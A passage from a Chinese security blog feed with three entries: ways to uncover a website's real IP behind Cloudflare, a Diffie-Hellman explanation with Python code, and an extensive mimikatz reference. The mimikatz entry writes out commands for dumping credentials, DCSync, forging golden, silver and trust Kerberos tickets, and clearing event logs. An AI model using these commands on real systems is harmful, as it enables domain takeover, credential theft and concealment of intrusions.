        <content type="html"><![CDATA[<p>1.老旧的cloudflare配置<br>cloudflare有一个直连DNS记录:<code>direct-connect</code> ,可以直接访问目标网站？不过随着DDOS攻击的泛滥,现在cloudflare把这个’绕过子域名’替换成更加随机的域名(dc-######-随机的hex哈希)</p><p>2.MX记录<br>MX记录一般会显示网站的邮箱服务器地址,基本上邮箱服务器地址都是目标的真实IP段,不过现在越来越多的邮箱服务都是托管在云上。如果目标使用的是office 365作为邮件服务器，那么可以到office 365上随便输入该网站一个不存在的邮箱，那么会自动跳转到目标的邮箱服务器。如果不存在，则提示没有这个ID；如果是托管，显示不变，也不跳转。</p><p>3.子域名<br>FTP/SCP/VPN等子域名可能会暴露目标真实IP</p><p>4.WEBSOCKET服务<br>cloudflare提供了针对websockets技术服务的访问，但是有些用户可能还不知道或者还未从自己的WS服务器上迁移过来。加上WS服务需要始终保持客户端服务端的连接，真实IP暴露的几率很大。</p><p>5.以前的DNS记录<br>可以在<a href="https://www.netcraft.com/%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9A%84%E5%8E%86%E5%8F%B2%E7%BA%AA%E5%BD%95%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%8C%85%E5%90%AB%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80">https://www.netcraft.com/网站查询网站的历史纪录，可能会包含真实IP地址</a></p><p>6.多地PING<br>目标可能购买的CDN服务没有覆盖全球，如果使用全球多个节点来ping，那么可能会得到真实的IP地址</p><p>7.SSRF<br>如果目标存在SSRF漏洞，则可以对我们设置的服务器发起一个请求，在服务器上用NC监听，服务器接收到请求后即可输出目标的IP地址</p><p>8.发邮件<br>给目标发送邮件，如果目标回复邮件，是不是可以得到目标的邮件服务器地址？</p><p><a href="https://rhinosecuritylabs.com/cloud-security/cloudflare-bypassing-cloud-security/">https://rhinosecuritylabs.com/cloud-security/cloudflare-bypassing-cloud-security/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cdn, web security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deffie-Hellman</title>
      <link href="2017/08/26/Deffie-Hellman/"/>
      <url>2017/08/26/Deffie-Hellman/</url>
      
        <content type="html"><![CDATA[<h5 id="数论基础"><a href="#数论基础" class="headerlink" title="数论基础"></a>数论基础</h5><p><code>Deffie-Hellman</code>属于密钥交换算法，要理解DH算法，前提要了解数论知识<br>假设A,P都是素数，那么下面两个集合相等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;a^1 mod p, a^2 mod p, a^3 mod p, ..., a^(p-1) mod p&#125; &#x3D; &#123;1, 2, 3, ..., p-1&#125;</span><br></pre></td></tr></table></figure><p>对于<code>1 &lt;=x, y &lt;= p-1</code>上面的等式可以概括为</p><ul><li><code>a^x mod p</code> 一定属于 <code>&#123;1,2,3,...,p-1&#125;</code></li><li>如果 <code>x!=y</code>，则<code>a^x mod p != a^y mod p</code></li><li>对于<code>1 &lt;= b &lt;= p-1</code>，一定存在唯一的<code>1 &lt;= x &lt;= p-1</code>，使得<code>b = a^x mod p</code></li></ul><h5 id="求模公式"><a href="#求模公式" class="headerlink" title="求模公式"></a>求模公式</h5><p>假设p为素数，对于正整数a, x, y有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a^x mod p)^y mod p &#x3D; a^(xy) mod p</span><br></pre></td></tr></table></figure><p>证明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">令 a^x &#x3D; mp + n,其中m, n为自然数, 0 &lt;&#x3D; n &lt; p,则有</span><br><span class="line">C &#x3D; (a^x mod p)^y mod p</span><br><span class="line">  &#x3D; ((mp + n) mod p)^y mod p</span><br><span class="line">  &#x3D; (mp mod p + n mod p)^y mod p</span><br><span class="line">  &#x3D; n^y mod p</span><br><span class="line">  &#x3D; (mp + n)^y mod p</span><br><span class="line">  &#x3D; a^(xy) mod p</span><br></pre></td></tr></table></figure><h5 id="DH算法原理"><a href="#DH算法原理" class="headerlink" title="DH算法原理"></a>DH算法原理</h5><p>A,B双方在通信之前需要交换密钥，共同选取了a, p两个素数，其中p和a均公开。A选取自然数Xa，计算出Ya，Xa保密，Ya公开。同理B选择Xb，计算出Yb。然后A使用Yb和Xa计算出密钥k，B使用Ya和Xb计算出密钥K，两者计算出的密钥K是相同的。</p><ul><li>选择共同的a, p素数</li><li>用户A操作: Xa &lt; p, Ya = a^Xa mod p</li><li>用户B操作: Xb &lt; p, Yb = a^Xb mod p</li><li>用户A计算K：K = Yb^Xa mod p =&gt; (a^Xb mod p)^Xa mod p</li><li>用户B计算K: K = Ya^Xb mod p =&gt; (a^Xa mod p)^Xb mod p</li></ul><p>通过上面的求模公式，可以得知A, B用户所计算出来的K是相同的，根据DH算法，可以得知Xa, Xb是密钥保护的关键，所以需要素数P的数值非常大，才能保证该算法的安全。</p><h5 id="DH密钥交换通信例子"><a href="#DH密钥交换通信例子" class="headerlink" title="DH密钥交换通信例子"></a>DH密钥交换通信例子</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Hash import SHA256</span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class="line">from Crypto import Random</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s):</span><br><span class="line">    return s + b&#39;\0&#39; * (AES.block_size - len(s) % AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(plaintext, key):</span><br><span class="line">    plaintext &#x3D; pad(plaintext)</span><br><span class="line">    iv &#x3D; Random.new().read(AES.block_size)</span><br><span class="line">    cipher &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    return iv + cipher.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(ciphertext, key):</span><br><span class="line">    iv &#x3D; ciphertext[:AES.block_size]</span><br><span class="line">    cipher &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext &#x3D; cipher.decrypt(ciphertext[AES.block_size:])</span><br><span class="line">    return plaintext.rstrip(b&#39;\0&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def diffiehellman(sock, bits&#x3D;2048):</span><br><span class="line">    p &#x3D; 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF;</span><br><span class="line">    a &#x3D; 2</span><br><span class="line">    x &#x3D; bytes_to_long(os.urandom(32))</span><br><span class="line">    Ya &#x3D; pow(a, x, p)</span><br><span class="line"></span><br><span class="line">    # send ya to user B</span><br><span class="line">    sock.send(long_to_bytes(Ya))</span><br><span class="line">    # user B recv ya(b)</span><br><span class="line">    b &#x3D; bytes_to_long(sock.recv(256))</span><br><span class="line"></span><br><span class="line">    Key &#x3D; pow(b, x, p)</span><br><span class="line">    return SHA256.new(long_to_bytes(Key)).digest()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mimikatz常用命令</title>
      <link href="2017/07/30/mimikatz-usage/"/>
      <url>2017/07/30/mimikatz-usage/</url>
      
        <content type="html"><![CDATA[<h3 id="mimikatz的一些常用模块"><a href="#mimikatz的一些常用模块" class="headerlink" title="mimikatz的一些常用模块"></a>mimikatz的一些常用模块</h3><h3 id="测试环境：Windows-2012-R2-子域DC"><a href="#测试环境：Windows-2012-R2-子域DC" class="headerlink" title="测试环境：Windows 2012 R2 子域DC"></a>测试环境：Windows 2012 R2 子域DC</h3><h3 id="1-CRYPTO模块"><a href="#1-CRYPTO模块" class="headerlink" title="1.CRYPTO模块"></a>1.CRYPTO模块</h3><p>crypto模块提供与Windows加密功能(CryptoAPI)接合的功能，主要用来导出那些没有被标记为“可导出”的证书</p><h5 id="crypto-capi-给CryptoAPI打补丁，方便导出证书"><a href="#crypto-capi-给CryptoAPI打补丁，方便导出证书" class="headerlink" title="crypto::capi 给CryptoAPI打补丁，方便导出证书"></a>crypto::capi 给CryptoAPI打补丁，方便导出证书</h5><p><img src="/img/crypto.capi.png"></p><h5 id="crypto-certificates-列出-导出证书"><a href="#crypto-certificates-列出-导出证书" class="headerlink" title="crypto::certificates 列出/导出证书"></a>crypto::certificates 列出/导出证书</h5><p>通常需要先执行<code>privilege::debug</code>提升权限</p><ul><li>/systemstore    -    可选    -    系统默认使用的证书存储类型（default:CERT_SYSTEM_STORE_CURRENT_USER）</li><li>/store    -    可选    -    用于列出/导出证书（默认为:My)</li><li>/export    -    可选    -    用于导出证书到文件<br><img src="/img/crypto.cer.png"></li><li><code>crypto::stores</code>列出可用的<code>systemstore</code>和<code>store</code>参数的可用值</li><li>不可导出的key在导出的时候会出现错误信息（KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)），可以使用<code>crypto::capi, crypto::cng</code>来进行补丁，通常可以导出，但是也需要相应的权限，比如UAC</li></ul><h5 id="crypto-cng-给CNG服务打补丁，方便导出证书（补丁Keylso服务）"><a href="#crypto-cng-给CNG服务打补丁，方便导出证书（补丁Keylso服务）" class="headerlink" title="crypto::cng    给CNG服务打补丁，方便导出证书（补丁Keylso服务）"></a>crypto::cng    给CNG服务打补丁，方便导出证书（补丁Keylso服务）</h5><h5 id="crypto-hash-对密码进行HASH操作"><a href="#crypto-hash-对密码进行HASH操作" class="headerlink" title="crypto::hash    对密码进行HASH操作"></a>crypto::hash    对密码进行HASH操作</h5><p><img src="/img/crypto.hash.png"></p><h5 id="crypto-keys-列出-导出密钥的容器"><a href="#crypto-keys-列出-导出密钥的容器" class="headerlink" title="crypto::keys    列出/导出密钥的容器"></a>crypto::keys    列出/导出密钥的容器</h5><p><img src="/img/crypto.keys.png"></p><h5 id="crypto-providers-列出加密提供商"><a href="#crypto-providers-列出加密提供商" class="headerlink" title="crypto::providers    列出加密提供商"></a>crypto::providers    列出加密提供商</h5><p><img src="/img/crypto.providers.png"></p><h5 id="crypto-stores-列出加密存储类型"><a href="#crypto-stores-列出加密存储类型" class="headerlink" title="crypto::stores        列出加密存储类型"></a>crypto::stores        列出加密存储类型</h5><p>/systemstore    -    可选    -    系统默认使用的证书存储类<br>store可用值:<br>CERT_SYSTEM_STORE_CURRENT_USER or CURRENT_USER<br>CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY or USER_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE or LOCAL_MACHINE<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY or LOCAL_MACHINE_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE or LOCAL_MACHINE_ENTERPRISE<br>CERT_SYSTEM_STORE_CURRENT_SERVICE or CURRENT_SERVICE<br>CERT_SYSTEM_STORE_USERS or USERS<br>CERT_SYSTEM_STORE_SERVICES or SERVICES</p><h5 id="crypto-system-提供系统证书文件的路径或者注册表配置"><a href="#crypto-system-提供系统证书文件的路径或者注册表配置" class="headerlink" title="crypto:system     提供系统证书文件的路径或者注册表配置"></a>crypto:system     提供系统证书文件的路径或者注册表配置</h5><h3 id="2-DPAPI模块"><a href="#2-DPAPI模块" class="headerlink" title="2.DPAPI模块"></a>2.DPAPI模块</h3><ul><li>DPAPI::BLOB    通过API或者Masterkey解除对DPAPI blob的保护</li><li>DPAII::CACHE</li><li>DPAPI::CAPI    CAPI KEY测试</li><li>DPAPI::CNG    CNG KEY测试</li><li>DPAPI::CRED    CER TEST</li><li>DPAPI::CREDHIST    配置一个credhist文件</li><li>DPAPI::MASTERKEY    配置一个masterkey文件或解除保护（需要密钥key）</li><li>DPAPI::PROTECT    使用DPAPI保护数据</li><li>DPAPI::VAULT        VAULT测试</li><li>DPAPI::WIFI        WIFI测试（需要XML配置文件 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&app=Excel">reference Ben’s spreadsheet</a>）</li><li>DPAPI::WWAN        WWAN测试（需要XML配置文件 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&app=Excel">reference Ben’s spreadsheet</a>）</li></ul><h3 id="3-EVENT模块"><a href="#3-EVENT模块" class="headerlink" title="3.EVENT模块"></a>3.EVENT模块</h3><p>1.EVENT::CLEAR    清除事件日志<br>2.EVENT::DROP    给事件记录服务打补丁，从而避免产生新的事件<br><img src="/img/event.png"></p><h3 id="4-KERBEROS模块"><a href="#4-KERBEROS模块" class="headerlink" title="4.KERBEROS模块"></a>4.KERBEROS模块</h3><p>KERBEROS模块用于与微软的KerberosAPI进行交互，执行该模块不需要特殊的权限</p><h5 id="KERBEROS-ASK-请求TGS票据"><a href="#KERBEROS-ASK-请求TGS票据" class="headerlink" title="KERBEROS::ASK    请求TGS票据"></a>KERBEROS::ASK    请求TGS票据</h5><p><img src="/img/kerberos.ask.png"></p><h5 id="KERBEROS-CLIST-列出在MIT-HEIMDALL缓存中的票据"><a href="#KERBEROS-CLIST-列出在MIT-HEIMDALL缓存中的票据" class="headerlink" title="KERBEROS::CLIST    列出在MIT/HEIMDALL缓存中的票据"></a>KERBEROS::CLIST    列出在MIT/HEIMDALL缓存中的票据</h5><h5 id="KERBEROS-GOLDEN-创建黄金票据-白银票据-信任票据"><a href="#KERBEROS-GOLDEN-创建黄金票据-白银票据-信任票据" class="headerlink" title="KERBEROS::GOLDEN    创建黄金票据/白银票据/信任票据"></a>KERBEROS::GOLDEN    创建黄金票据/白银票据/信任票据</h5><p>该命令的功能是基于检索到的密码的hash类型类执行的</p><h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>使用黄金票据必须的一些条件：</p><ul><li>域的名称，可使用(Get-ADDomain).DNSRoot获得</li><li>域的SID，可使用(Get-ADDomain).DomainSID.Value获得</li><li>krbtgt账户的密码HASH,可以用mimikatz的<code>lssdump::lsa /inject /name:krbtgt</code>命令获得</li><li>一个用于模拟的用户ID（可以存在也可以不存在）</li></ul><p>黄金票据的参数：</p><ul><li>/domain    指定域的名字</li><li>/sid        指定域的SID</li><li>/sids        指定想要欺骗在AD林中的其他用户/组的SID，通常根域中的 Enterprise Admins group 的SID为“S-1-5-21-1473643419-774954089-5872329127-519”</li><li>/user        一个用于模拟的用户名</li><li>/groups    可选，用户组的RID（通常第一个是主要的组），添加用户/计算机用户的RID，获得相对应的权限。默认管理组的RID： 513,512,520,518,519 </li><li>/krbtgt    域KDC服务账户（krbtgt）的NTLM密码HASH，用于加密和签名TGT</li><li>/ticket    可选，用于提供一个路径/名称来保存黄金票据，方便用户之后能够快速使用/ptt参数来将黄金票据注入到内存中使用</li><li>/ptt        /ticket的代替参数，可以快速注入外部的黄金票据到内存中</li><li>/id        可选，用户的RID，默认是500，为administrator的RID</li><li>/startoffset    可选，票据可用时的起始偏移量（通常为-10和0），mimikatz默认为0</li><li>/endin    可选，票据的生命周期，mimikatz默认为10年，AD的Kerberos策略默认设置为10小时</li><li>/renewmax    可选，更新后的票据的最大生命周期，mimikatz默认10年，AD的Kerberos策略默认设置为7天，10080min</li><li>/aes128    AES128 KEY</li><li>/aes256    AES256 KEY</li></ul><p>黄金票据的默认组：</p><ul><li>Domain Users SID: S-1-5-21<DOMAINID>-513</li><li>Domain Admins SID: S-1-5-21<DOMAINID>-512</li><li>Schema Admins SID: S-1-5-21<DOMAINID>-518</li><li>Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)</li><li>Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:ADMIINACCOUNTNAME &#x2F;domain:DOMAINFQDN &#x2F;id:ACCOUNTRID &#x2F;sid:DOMAINSID &#x2F;krbtgt:KRBTGTPASSWORDHASH &#x2F;ptt</span><br></pre></td></tr></table></figure><p><img src="/img/kerberos.godlen.jpg"></p><h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>白银票据是一个TGS（和TGT的格式类似），使用了目标服务账户（由SPN映射标识）的NTLM密码HASH来进行加密和签名，mimikatz使用<code>kerberos::golden</code>来创建一个白银票据，白银票据创建的是TGS服务，只能访问有限的服务。<br>创建白银票据必要的参数，其他参数和黄金票据一样</p><ul><li>/target    目标服务器的FQDN</li><li>/service    目标服务器上运行的Kerberos服务，这里填运行该服务的主体的名称，比如cifs，http，mssql</li><li>/rc4        目标服务器的NTLM HASH（计算机账户或者用户账户，<strong>一般为计算机账户，比如计算机名为DC,那么就是要DC$的HASH</strong>）</li></ul><p>白银票据的默认组</p><ul><li>Domain Users SID: S-1-5-21<DOMAINID>-513</li><li>Domain Admins SID: S-1-5-21<DOMAINID>-512</li><li>Schema Admins SID: S-1-5-21<DOMAINID>-518</li><li>Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)</li><li>Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;admin:LukeSkywalker &#x2F;id:1106 &#x2F;domain:lab.adsecurity.org &#x2F;sid:S-1-5-21-1473643419-774954089-2222329127 &#x2F;target:adsmswin2k8r2.lab.adsecurity.org &#x2F;rc4:d7e2b80507ea074ad59f152a1ba20458 &#x2F;service:cifs &#x2F;ptt” exit</span><br></pre></td></tr></table></figure><p><img src="/img/silver.jpg"></p><h4 id="信任票据"><a href="#信任票据" class="headerlink" title="信任票据"></a>信任票据</h4><p>一旦AD的信任密码HASH确定后，一个信任票据就会被创建（Mimikatz “privilege::debug” “lsadump::trust /patch” exit）</p><h5 id="伪造一个内部AD林的信任票据"><a href="#伪造一个内部AD林的信任票据" class="headerlink" title="伪造一个内部AD林的信任票据"></a>伪造一个内部AD林的信任票据</h5><p>步骤1：导出受信任的密码/密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;lsadump::trust &#x2F;patch&quot; exit</span><br></pre></td></tr></table></figure><p><img src="/img/trust1.jpg"></p><p>步骤2：使用Mimikatz创建一个伪造的受信任票据（跨域TGT）<br>伪造票据说明了该票据的持有者为AD林中的Enterprise Admin，拥有从子域到父域的完全访问权限。值得注意的是该伪造的用户不存在于任何计算机上，因为使用了黄金票据来得到域的信任，mimikatz使用<code>kerberos::golden</code>来创建一个信任票据。<br>创建信任票据必要的参数，其他参数和黄金票据一样</p><ul><li>/target    目标域名的FQDN</li><li>/service    目标服务器上运行的kerberos服务（krbtgt）</li><li>/rc4        目标服务器上运行Kerberos服务的服务账号的NTLM HASH（krbtgt）</li><li>/ticket    提供一个路径/名字来保存伪造的票据，方便之后使用/ptt参数快速将黄金票据注入到内存中使用</li></ul><p>信任票据的默认组</p><ul><li>Domain Users SID: S-1-5-21<DOMAINID>-513</li><li>Domain Admins SID: S-1-5-21<DOMAINID>-512</li><li>Schema Admins SID: S-1-5-21<DOMAINID>-518</li><li>Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (只有在林的根域中创建了伪造的票据并且使用/sids参数指定AD林中的管理员权限的情况下才会有效)</li><li>Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz “kerberos::golden &#x2F;domain:child.adsec.lab &#x2F;sid:S-1-5-21-1420805320-1455282633-3118636415 &#x2F;sids:S-1-5-21-809894267-1102385918-1530562782-519 &#x2F;rc4:79003cc0433d25fe9606cf46f2aea8d1 &#x2F;user:deadfk3 &#x2F;service:krbtgt &#x2F;target:adsec.lab &#x2F;ticket:c:\temp\CHILD.ADSEC.LAB.kirbi” exit</span><br><span class="line">SIDS是父域的Enterprise Admin SID，SID是当前域的SID，NTLM HASH是父域的rc4,使用lsadump::trust &#x2F;patch可以得到</span><br><span class="line">注：使用SIDS参数会创建一个信任票据，从而告诉目标域，该信任票据的持有者是一个Enterprise Admin成员</span><br></pre></td></tr></table></figure><p><img src="/img/trust2.jpg"></p><p>步骤3：使用步骤2创建的信任票据去获得目标域上目标服务的TGS，并保存TGS到文件<br>结果是TGS给EA提供了访问父（根）域的域控制器上的CIFS服务的权限<br><img src="/img/kekeo1.jpg"></p><p>步骤4：把步骤3生成的TGS文件注入，以获得相应的权限去访问目标服务<br>注入前：<br><img src="/img/kekeo3.jpg"><br>注入后：<br><img src="/img/kekeo2.jpg"></p><h5 id="KERBEROS-Hash-把密码hash成密钥"><a href="#KERBEROS-Hash-把密码hash成密钥" class="headerlink" title="KERBEROS::Hash    -    把密码hash成密钥"></a>KERBEROS::Hash    -    把密码hash成密钥</h5><h5 id="KERBEROS-List-列出所有保存在用户内存中的用户的票据（TGT-TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist"><a href="#KERBEROS-List-列出所有保存在用户内存中的用户的票据（TGT-TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist" class="headerlink" title="KERBEROS::List    -    列出所有保存在用户内存中的用户的票据（TGT/TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist"></a>KERBEROS::List    -    列出所有保存在用户内存中的用户的票据（TGT/TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist</h5><ul><li>/export    -    导出用户的票据到文件</li></ul><p>使用<code>SEKURLSA::TICKETS</code>命令把当前系统上所有已验证用户的kerberos票据dump下来。有些情况下用户的证书不会导出，这时候需要运行<code>SEKURLSA::TICKETS /EXPORT</code>,需要相应的权限。<br><img src="/img/kerberos.list.jpg"></p><h5 id="KERBEROS-PTC-传递缓存（NT6）"><a href="#KERBEROS-PTC-传递缓存（NT6）" class="headerlink" title="KERBEROS::PTC        -    传递缓存（NT6）"></a>KERBEROS::PTC        -    传递缓存（NT6）</h5><p>*Nix类的系统，都会缓存kerberos凭证，这些缓存的数据可以使用mimikatz来进行拷贝和传递，同样对把Kerberos票据注入到缓存文件中也很有帮助。一个例子就是利用MS14068的漏洞，使用pykeke生成一个缓存文件，然后使用mimikatz的kerberos:ptc命令注入。</p><h5 id="KERBEROS-PTT-传递票据"><a href="#KERBEROS-PTT-传递票据" class="headerlink" title="KERBEROS::PTT        -    传递票据"></a>KERBEROS::PTT        -    传递票据</h5><p>当得到一个Kerberos票据之后，它可以拷贝到其他系统上，并且能够有效的注入到当前会话，来模拟一次登陆，而无需与域控有任何通信，不需要特殊权限。<br>命令：SEKURLSA::PTT(pass-the-ticket)</p><ul><li>/filename    -    票据文件名，可以多个</li><li>/diretory    -    票据目录，该目录下的所有kirbi文件都会被注入</li></ul><p>先生成一个kribi黄金票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;kerberos::golden &#x2F;admin:deadfk &#x2F;domain:child.adsec.lab &#x2F;id:8888 &#x2F;sid:S-1-5-21-1420805320-1455282633-3118636415 &#x2F;krbtgt:a2ba962ef41bb5e9635c2ae3173ee8a3 &#x2F;ticket:deadfk.kribi&quot; exit</span><br></pre></td></tr></table></figure><p>再使用ptt来注入<br><img src="/img/kerberos.ptt.jpg"></p><h5 id="KERBEROS-PURGE-清除当前会话中的所有kerberos票据"><a href="#KERBEROS-PURGE-清除当前会话中的所有kerberos票据" class="headerlink" title="KERBEROS::PURGE    清除当前会话中的所有kerberos票据"></a>KERBEROS::PURGE    清除当前会话中的所有kerberos票据</h5><h5 id="KERBEROS-TGT-获得当前用户的TGT"><a href="#KERBEROS-TGT-获得当前用户的TGT" class="headerlink" title="KERBEROS::TGT        获得当前用户的TGT"></a>KERBEROS::TGT        获得当前用户的TGT</h5><p><img src="/img/kerberos.tgt.jpg"></p><h3 id="5-LSADUMP"><a href="#5-LSADUMP" class="headerlink" title="5.LSADUMP"></a>5.LSADUMP</h3><p>LSADUMP模块通过与Windows本地安全验证机构（LSA）进行交互获得凭证信息。该模块的大多数命令都需要<code>debug</code>权限或者本地管理员权限，一般管理员组都有<code>debug</code>权限，必须要用户手动输入<code>privilege::debug</code>才能进行提权.</p><h5 id="LSADUMP-BACKUPKEYS"><a href="#LSADUMP-BACKUPKEYS" class="headerlink" title="LSADUMP::BACKUPKEYS"></a>LSADUMP::BACKUPKEYS</h5><p>要求管理员权限<br><img src="/img/lsadump.backupkeys.jpg"></p><h5 id="LSADUMP-CACHE-获取Syskey用来解密NL-KM-AND-MSCACHE-V2-从注册表或者hives文件中获取"><a href="#LSADUMP-CACHE-获取Syskey用来解密NL-KM-AND-MSCACHE-V2-从注册表或者hives文件中获取" class="headerlink" title="LSADUMP::CACHE    -    获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)"></a>LSADUMP::CACHE    -    获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)</h5><p>需要管理员权限<br><img src="/img/lsadump.cache.jpg"></p><h5 id="LSADUMP-DCSYNC-向DC发起一个同步对象请求-获取账户密码数据"><a href="#LSADUMP-DCSYNC-向DC发起一个同步对象请求-获取账户密码数据" class="headerlink" title="LSADUMP::DCSYNC    -    向DC发起一个同步对象请求(获取账户密码数据)"></a>LSADUMP::DCSYNC    -    向DC发起一个同步对象请求(获取账户密码数据)</h5><p>要运行该命令,需要一些指定的权限:管理员组,域管理员组,企业管理员组成员以及域控制器的计算机账户都可以通过DCSync把密码读取出来.需要注意的是被设置只读属性的域控制器是无法把密码读取出来的。</p><h6 id="DCSync是如何工作的"><a href="#DCSync是如何工作的" class="headerlink" title="DCSync是如何工作的"></a>DCSync是如何工作的</h6><ul><li>发现用户所指定的域名的域控制器</li><li>通过GetNCChanges去请求域控制器获取用户的凭证（利用了远程协议服务Directory Replication Service (DRS)）</li></ul><p>DCSync参数选项</p><ul><li>/user    -    要获取的数据的用户ID或者SID</li><li>/domain    -    可选，活动目录的FQDN域名。mimikatz会自动发现该域名下的DC，如果不指定该参数，默认是当前域</li><li>/dc    -    指定域控</li><li>/guid</li></ul><p>命令例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从child.adsec.lab域取回jane用户的密码</span><br><span class="line">Mimikatz “privilege::debug” “lsadump::dcsync &#x2F;domain:child.adsec.lab &#x2F;user:jane” exit</span><br></pre></td></tr></table></figure><p><img src="/img/lsadump.dcsync.jpg"></p><h5 id="LSADUMP-LSA-从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证"><a href="#LSADUMP-LSA-从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证" class="headerlink" title="LSADUMP::LSA    -    从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证"></a>LSADUMP::LSA    -    从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证</h5><p>要求system或者debug权限</p><ul><li>/inject - 注入LSASS进程获取凭证</li><li>/name - 指定目标用户</li><li>/id    - 目标账户的RID</li><li>/patch - 补丁LSASS进程</li></ul><p><code>mimikatz &quot;lsadump::lsa /inject&quot; exit</code><br>该命令如果在DC上运行，会导出整个活动目录的凭证信息，RID 502的是KRBTGT用户，RID 500的是默认域管理员账户<br><img src="/img/lsadump.lsa1.jpg"><br><code>lsadump::lsa /patch</code>只会导出活动目录里的NTLM HASH<br><img src="/img/lsadump.lsa2.jpg"></p><h5 id="LSADUMP-NETSYNC"><a href="#LSADUMP-NETSYNC" class="headerlink" 